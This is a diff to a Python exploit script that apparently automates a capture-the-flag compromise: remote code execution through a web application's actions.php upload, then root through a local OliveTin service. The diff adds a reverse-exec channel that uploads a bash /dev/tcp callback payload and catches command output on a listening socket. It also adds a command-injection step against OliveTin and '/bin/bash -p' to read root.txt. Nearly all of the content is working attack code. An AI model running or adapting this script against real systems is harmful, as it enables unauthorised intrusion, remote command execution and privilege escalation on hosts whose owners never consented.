@@ -19,7 +19,9 @@ import base64
 import io
 import os
 import re
+import socket
 import sys
+import threading
 import time
 import urllib.parse
 import urllib.request
@@ -244,6 +246,59 @@ def rev_shell(o, base, mid, pid, lhost, lport, method="bash"):
     upload(o, base, mid, pid, payloads.get(method, payloads["bash"]))
 
 
+def lhost_for(base):
+    host = urllib.parse.urlparse(base).hostname
+    ip = socket.gethostbyname(host)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((ip, 80))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+def run_rev(o, base, mid, pid, lhost, cmd, wait=18):
+    """Reverse-exec via the stager: the payload connects back to us and pipes
+    `cmd` output over the socket. Works only if the box can reach lhost, but the
+    stager guarantees the (now unbounded) payload actually runs."""
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", 0))
+    port = srv.getsockname()[1]
+    srv.listen(1)
+    srv.settimeout(wait)
+    out = {}
+
+    def serve():
+        try:
+            conn, _ = srv.accept()
+            conn.settimeout(wait)
+            buf = b""
+            while True:
+                try:
+                    d = conn.recv(4096)
+                except socket.timeout:
+                    break
+                if not d:
+                    break
+                buf += d
+            out["d"] = buf
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            srv.close()
+
+    t = threading.Thread(target=serve, daemon=True)
+    t.start()
+    time.sleep(0.3)
+    payload = (f"exec 3<>/dev/tcp/{lhost}/{port} && {{ {cmd} ; }} >&3 2>&3 ; "
+               "exec 3>&- 3<&-")
+    upload(o, base, mid, pid, payload)
+    t.join(timeout=wait + 2)
+    return out.get("d", b"").decode("utf-8", "replace")
+
+
 def exec_confirmed(o, base, mid, pid, seconds=6):
     """Timing oracle: if a `sleep N` payload delays the response by ~N, code
     execution is proven regardless of whether we can read output back."""
@@ -254,10 +309,9 @@ def exec_confirmed(o, base, mid, pid, seconds=6):
 
 
 # ---- OliveTin root ------------------------------------------------------
-def olivetin_root(o, base, mid, pid, lhost):
+def olivetin_root_run(run):
     log("*", "checking for a local OliveTin (127.0.0.1:1337) …")
-    listening = run_cmd(o, base, mid, pid, lhost,
-                        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
+    listening = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
     if ":1337" not in listening:
         log(".", "no OliveTin on :1337 — root step skipped")
         return ""
@@ -269,8 +323,8 @@ def olivetin_root(o, base, mid, pid, lhost):
                        "arguments": {"db_pass": inject}})
     fire = (f"curl -s -m 8 -X POST http://127.0.0.1:1337/api/StartActionAndWait "
             f"-H 'Content-Type: application/json' -d {json.dumps(body)}")
-    run_cmd(o, base, mid, pid, lhost, fire)
-    return run_cmd(o, base, mid, pid, lhost,
+    run(fire)
+    return run(
                    "cat /tmp/.rf 2>/dev/null; /bin/bash -p -c 'id; cat /root/root.txt'")
 
 
@@ -314,31 +368,38 @@ def main():
             log(".", f"  {m}/{p}: HTTP {st} {resp.strip()[:100]!r}")
         sys.exit(4)
 
-    log("*", "reading output via op=download (writing output to a .xml, "
-             "downloading it back by index) …")
-    probe = run_cmd(o, base, mid, pid, None, "id; hostname; pwd")
-    if "uid=" not in probe:
-        log("!", "op=download didn't return our marker — dumping the file list so "
-                 "we can see what's in the sales import dir:")
+    # Establish an output channel. Try reverse-exec first (now that the stager
+    # makes any-length payloads run) then the file-write/op=download fallback.
+    lhost = sys.argv[4] if len(sys.argv) > 4 else lhost_for(base)
+    runner = None
+    log("*", f"trying reverse-exec channel (lhost {lhost}) …")
+    if "uid=" in run_rev(o, base, mid, pid, lhost, "id; hostname"):
+        log("+", "reverse-exec channel LIVE (box can reach you)")
+        runner = lambda c: run_rev(o, base, mid, pid, lhost, c)  # noqa: E731
+    else:
+        log(".", "no reverse callback — egress likely blocked; trying file-write")
+        if "uid=" in run_cmd(o, base, mid, pid, None, "id; hostname"):
+            log("+", "file-write/op=download channel LIVE")
+            runner = lambda c: run_cmd(o, base, mid, pid, None, c)  # noqa: E731
+    if not runner:
+        log("!", "exec is proven but no output channel worked. Dumping download "
+                 "list for diagnosis:")
         for fid in range(0, 6):
-            u = (f"{base}/actions.php?op=download&id_module={mid}"
-                 f"&id_plugin={pid}&file_id={fid}")
-            body = get(o, u)
-            log(".", f"  download file_id={fid} -> {len(body)}B: {body.strip()[:120]!r}")
+            body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
+                          f"&id_plugin={pid}&file_id={fid}")
+            log(".", f"  download file_id={fid} -> {body.strip()[:100]!r}")
         sys.exit(5)
-    log("+", "RCE output channel live:")
-    for ln in probe.strip().splitlines():
+
+    log("+", "RCE output:")
+    for ln in runner("id; hostname; pwd").strip().splitlines():
         print("      " + ln)
 
-    flag = run_cmd(o, base, mid, pid, None,
-                   "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
+    flag = runner("cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
     m = re.search(r"[0-9a-f]{32}", flag)
-    if m:
-        log("+", f"USER FLAG: {m.group(0)}")
-    else:
-        log(".", f"user.txt not in the usual spots; raw: {flag.strip()[:120]!r}")
+    log("+", f"USER FLAG: {m.group(0)}") if m else \
+        log(".", f"user.txt not found; raw: {flag.strip()[:120]!r}")
 
-    root = olivetin_root(o, base, mid, pid, None)
+    root = olivetin_root_run(runner)
     r = re.search(r"[0-9a-f]{32}", root)
     if r:
         log("+", f"ROOT FLAG: {r.group(0)}")
